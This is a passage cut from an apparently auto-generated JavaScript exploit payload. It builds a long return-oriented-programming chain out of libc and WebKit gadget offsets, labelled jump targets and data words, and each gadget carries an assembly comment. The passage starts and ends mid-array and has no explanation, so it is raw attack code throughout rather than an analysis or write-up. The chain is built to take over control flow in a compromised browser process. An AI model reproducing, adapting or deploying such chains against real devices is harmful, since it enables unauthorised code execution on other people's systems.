libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+200624, //L3131
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+200608, //L3130
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3130:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3131:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+200784, //L3134
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+200816, //L3136
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+200768, //L3133
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+200800, //L3135
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3133:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3134:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3135:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3136:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+200928, //L3137
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+200960, //L3139
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+200944, //L3138
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3137:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3138:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3139:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+764700, //add rax, rcx
libc_base+713278, //pop rsi
ropchain+201048, //L3140
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3140:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+201104, //L3142
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3142:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+201176, //L3144
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3144:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+201232, //L3146
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3146:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+887232, //mov [rax], cl
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
//L3148:
libc_base+713278, //pop rsi
ropchain+201336, //L3150
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3149:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+772328,); //pop rcx
//L3150:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+201440, //L3153
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+201424, //L3152
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3152:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3153:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+201600, //L3156
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+201632, //L3158
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+201584, //L3155
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+201616, //L3157
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3155:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3156:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3157:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3158:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+201728, //L3160
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+201712, //L3159
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L3159:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3160:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+201816, //L3162
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L3161:
db([1, 0]); // 0x1
set_gadget(libc_base+768796,); //pop rax
//L3162:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+201888, //L3164
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3163:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+772328,); //pop rcx
//L3164:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+972324, //mov [rax], ecx
libc_base+713278, //pop rsi
ropchain+201952, //L3166
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3166:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+489696, //pop rsp
ropchain+195736, //L3007
//L3040:
libc_base+489696, //pop rsp
ropchain+212368, //L3168
//L2995:
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+202064, //L3169
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3169:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3170:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796 //pop rax
]);
//L3171:
db([1, 0]); // 0x1
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796 //pop rax
]);
//L3172:
db([2, 0]); // 0x2
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796, //pop rax
//L3174:
ropchain+202280, //L3173
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+489696, //pop rsp
ropchain+220632, //L3175
//L3173:
libc_base+863109, //mov rax, rcx
libc_base+713278 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+202368, //L3177
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3176:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+772328,); //pop rcx
//L3177:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+972324, //mov [rax], ecx
libc_base+388400, //mov rax, rdi
libc_base+772328 //pop rcx
]);
//L3179:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+887232, //mov [rax], cl
libc_base+713278, //pop rsi
ropchain+202472, //L3182
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L3181:
db([1, 0]); // 0x1
set_gadget(libc_base+768796,); //pop rax
//L3182:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+388400, //mov rax, rdi
libc_base+772328 //pop rcx
]);
//L3183:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+887232, //mov [rax], cl
libc_base+713278, //pop rsi
ropchain+202568, //L3186
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L3185:
db([1, 0]); // 0x1
set_gadget(libc_base+768796,); //pop rax
//L3186:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+887232, //mov [rax], cl
libc_base+713278, //pop rsi
ropchain+202640, //L3188
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L3187:
db([1, 0]); // 0x1
set_gadget(libc_base+768796,); //pop rax
//L3188:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+887232, //mov [rax], cl
libc_base+713278, //pop rsi
ropchain+202712, //L3190
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L3189:
db([1, 0]); // 0x1
set_gadget(libc_base+768796,); //pop rax
//L3190:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+887232, //mov [rax], cl
libc_base+713278, //pop rsi
ropchain+202784, //L3192
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L3191:
db([1, 0]); // 0x1
set_gadget(libc_base+768796,); //pop rax
//L3192:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+887232, //mov [rax], cl
libc_base+713278, //pop rsi
ropchain+202856, //L3194
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L3193:
db([1, 0]); // 0x1
set_gadget(libc_base+768796,); //pop rax
//L3194:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+887232, //mov [rax], cl
libc_base+713278, //pop rsi
ropchain+202928, //L3196
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L3195:
db([1, 0]); // 0x1
set_gadget(libc_base+768796,); //pop rax
//L3196:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+887232, //mov [rax], cl
libc_base+713278, //pop rsi
ropchain+203000, //L3198
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L3197:
db([1, 0]); // 0x1
set_gadget(libc_base+768796,); //pop rax
//L3198:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+887232, //mov [rax], cl
libc_base+713278, //pop rsi
ropchain+203072, //L3200
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L3199:
db([1, 0]); // 0x1
set_gadget(libc_base+768796,); //pop rax
//L3200:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3201:
db([4294967257, 4294967295]); // -0x27
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+203168, //L3204
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3203:
db([2, 0]); // 0x2
set_gadget(libc_base+768796,); //pop rax
//L3204:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+887232, //mov [rax], cl
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3205:
db([4294967258, 4294967295]); // -0x26
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+203272, //L3208
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+772328 //pop rcx
]);
//L3207:
db([15395, 0]); // 0x3c23
set_gadget(libc_base+165442,); //pop rdi
//L3208:
db([0, 0]); // 0x0
set_gadgets([
libc_base+524088, //mov [rdi], cx
libc_base+713278, //pop rsi
ropchain+203344, //L3211
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3210:
db([4294967260, 4294967295]); // -0x24
set_gadget(libc_base+165442,); //pop rdi
//L3211:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+203408, //L3214
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3213:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3214:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+972324, //mov [rax], ecx
libc_base+713278, //pop rsi
ropchain+203456, //L3215
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3215:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3216:
db([16, 0]); // 0x10
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+203568, //L3218
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L3217:
db([4294967256, 4294967295]); // -0x28
set_gadget(libc_base+768796,); //pop rax
//L3218:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+203672, //L3220
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3219:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+772328,); //pop rcx
//L3220:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+203776, //L3223
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+203760, //L3222
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3222:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3223:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+203936, //L3226
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+203968, //L3228
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+203920, //L3225
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+203952, //L3227
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3225:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3226:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3227:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3228:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+204064, //L3230
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+204048, //L3229
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L3229:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3230:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796, //pop rax
//L3232:
ropchain+204168, //L3231
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+489696, //pop rsp
ropchain+223288, //L3233
//L3231:
libc_base+863109, //mov rax, rcx
libc_base+713278 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796 //pop rax
]);
//L3234:
db([1, 0]); // 0x1
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+204304, //L3236
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3235:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+772328,); //pop rcx
//L3236:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+204408, //L3239
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+204392, //L3238
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3238:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3239:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+204568, //L3242
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+204600, //L3244
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+204552, //L3241
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+204584, //L3243
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3241:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3242:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3243:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3244:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+204696, //L3246
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+204680, //L3245
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L3245:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3246:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796, //pop rax
//L3248:
ropchain+204800, //L3247
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+489696, //pop rsp
ropchain+221960, //L3249
//L3247:
libc_base+863109, //mov rax, rcx
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796 //pop rax
]);
//L3250:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796 //pop rax
]);
//L3251:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+204984, //L3253
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3252:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+772328,); //pop rcx
//L3253:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+205088, //L3256
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+205072, //L3255
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3255:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3256:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+205248, //L3259
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+205280, //L3261
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+205232, //L3258
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+205264, //L3260
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3258:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3259:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3260:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3261:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+205376, //L3263
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+205360, //L3262
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L3262:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3263:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796, //pop rax
//L3265:
ropchain+205480, //L3264
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+489696, //pop rsp
ropchain+213944, //L3266
//L3264:
libc_base+863109, //mov rax, rcx
libc_base+713278 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+205608, //L3267
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+205640, //L3269
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+205624, //L3268
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L3267:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L3268:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L3269:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+205744, //L3271
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+205760, //L3272
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3270:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+772328,); //pop rcx
//L3271:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3272:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+972324, //mov [rax], ecx
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3274:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+772328,); //pop rcx
//L3275:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+205920, //L3278
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+205904, //L3277
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3277:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3278:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+206024, //L3281
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+206040, //L3282
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3280:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+772328,); //pop rcx
//L3281:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3282:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+2989859, //mov [rax], rcx
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3284:
db([4294967244, 4294967295]); // -0x34
set_gadget(libc_base+772328,); //pop rcx
//L3285:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+206160, //L3288
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L3287:
db([65536, 0]); // 0x10000
set_gadget(libc_base+768796,); //pop rax
//L3288:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+972324, //mov [rax], ecx
libc_base+713278, //pop rsi
ropchain+206216, //L3290
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3290:
db([0, 0]); // 0x0
//L3289:
set_gadgets([
libc_base+713278, //pop rsi
ropchain+206280, //L3293
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L3292:
db([4294967244, 4294967295]); // -0x34
set_gadget(libc_base+772328,); //pop rcx
//L3293:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+206384, //L3296
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+206368, //L3295
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L3295:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L3296:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+206544, //L3299
